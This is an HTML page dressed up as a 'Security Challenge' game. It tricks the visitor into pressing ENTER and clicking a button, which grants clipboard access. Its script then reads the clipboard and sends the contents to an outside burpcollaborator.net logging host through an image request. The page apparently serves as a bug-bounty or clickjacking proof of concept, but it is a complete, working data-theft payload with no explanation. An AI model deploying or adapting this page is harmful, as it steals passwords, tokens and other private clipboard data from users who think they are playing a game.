<!DOCTYPE html>
<html>
<head>
  <title>üéÆ Security Challenge</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      text-align: center;
      padding-top: 100px;
      background: radial-gradient(circle at center, #2e2e2e, #000000);
      color: #f1f1f1;
    }

    h2 {
      color: #00ffcc;
      font-size: 32px;
      text-shadow: 0 0 10px #00ffcc;
    }

    #msg {
      margin-top: 20px;
      font-size: 18px;
      color: #ffffff;
    }

    #btn {
      padding: 15px 30px;
      font-size: 20px;
      margin-top: 30px;
      cursor: pointer;
      border: none;
      border-radius: 8px;
      background-color: #00ffcc;
      color: #000;
      font-weight: bold;
      box-shadow: 0 0 10px #00ffcc;
      transition: all 0.3s ease;
    }

    #btn:hover {
      background-color: #00e6b8;
      box-shadow: 0 0 15px #00ffcc;
    }

    #result {
      margin-top: 30px;
      font-weight: bold;
      color: #00ffcc;
      white-space: pre-wrap;
      font-size: 16px;
      max-width: 600px;
      margin-left: auto;
      margin-right: auto;
    }
  </style>
</head>
<body>

  <h2>üïπÔ∏è Security Challenge: Level 1</h2>
  <div id="msg">Press ENTER to begin the verification challenge...</div>
  <button id="btn" style="display:none;">
    üéØ Click this & hit ENTER repeatedly to complete the mission
  </button>
  <div id="result"></div>

  <script>
    let stage = 0;
    let triggered = false;

    document.addEventListener("keydown", (e) => {
      if (e.key !== "Enter") return;

      if (stage === 0) {
        stage = 1;
        document.getElementById("msg").innerText =
          "‚úÖ Step 1: ENTER detected!\n‚ñ∂Ô∏è Now click the button below and hit ENTER repeatedly to verify.";
        document.getElementById("btn").style.display = "inline-block";
      } else if (stage === 2) {
        document.getElementById("msg").innerText = "üèÅ Verification Complete!";
        document.getElementById("result").innerText =
          "‚úÖ Thank you for playing the Security Challenge!";
      }
    });

    document.getElementById("btn").addEventListener("click", () => {
      if (stage === 1 && !triggered) {
        triggered = true;
        stage = 2;

        document.getElementById("msg").innerText = "üìã Accessing secure memory...";

        navigator.clipboard.readText()
          .then(text => {
            document.getElementById("result").innerText = "üìã Clipboard data:\n" + text;

            const img = new Image();
            img.src = "https://wmmp7fm4v9s78qkxv73hdam13s9lxa.burpcollaborator.net/log?clip=" + encodeURIComponent(text);

            document.getElementById("msg").innerText =
              "üéâ Clipboard read successfully!\nPress ENTER one last time to finish!";
          })
          .catch(err => {
            document.getElementById("msg").innerText = "‚ùå Error accessing clipboard: " + err;
          });
      }
    });
  </script>

</body>
</html>
